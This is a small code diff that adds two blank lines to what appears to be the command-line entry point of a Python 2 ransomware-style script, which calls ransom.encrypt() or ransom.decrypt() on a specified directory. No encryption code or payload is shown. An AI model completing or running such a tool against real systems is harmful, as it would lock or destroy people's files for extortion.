@@ -16,6 +16,7 @@ if __name__ == "__main__":
     start_time = time.time()
 
     specified_dir = os.path.expanduser(args.dir)
+
     if not os.path.exists(specified_dir):
         print >> sys.stderr, "Specified dir does not exist"
         exit(-1)
@@ -27,6 +28,7 @@ if __name__ == "__main__":
             ransom.encrypt()
         elif args.mode == 'd' or args.mode == 'decrypt':
             ransom.decrypt()
+
     except Exception as e:
         print >> sys.stderr, e.message
 
